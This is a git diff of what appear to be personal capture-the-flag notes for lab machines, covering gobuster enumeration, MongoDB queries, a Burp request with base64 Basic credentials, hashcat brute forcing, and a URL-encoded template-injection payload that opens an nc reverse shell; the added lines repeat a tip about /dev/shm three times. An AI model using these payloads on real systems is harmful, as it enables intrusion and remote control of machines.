@@ -175,6 +175,8 @@ http://10.10.149.190/island/2100/ (original), that displays
 <!-- you can avail your .ticket here but how?   -->
 
 Bruteforce the .ticket extension file with gobuster
+if you create some python file under /tmp, it needs to install some python library
+But if you create python file under /dev/shm, you don't need any necessary library file.
 ----------------------------------------------------
 gobuster dir -u http://10.10.149.190/island/2100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 80 -x ticket
 ____________________________________________________________________________________________________________________________________
@@ -185,7 +187,9 @@ port 27017 => mongodb
 #show dbs;
 #show collections;
 #db.user.find();
-_________________________________________________________________________________________________________________________________________________________________________________________________________________
+_______________________________________________________________________________
+if you create some python file under /tmp, it needs to install some python library
+But if you create python file under /dev/shm, you don't need any necessary library file.__________________________________________________________________________________________________________________________________
 Authorization: Basic cmFzY2FsOm1hZ2ljaw==  (original in burpsuite)
 Connection: close
 Referer: http://10.10.149.114/
@@ -301,6 +305,8 @@ Maths%0A<%25%3d+`rm+-f+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+
 hashcat -a 3 -m 1400 su.txt --increment susan_nasus_?d?d?d?d?d?d?d?d?d?d
 
 --increment means it brutforces incrementally.
+________________________________________________________________________________________________________________________________________________________________________________________________________________
 
-
+if you create some python file under /tmp, it needs to install some python library
+But if you create python file under /dev/shm, you don't need any necessary library file.
 
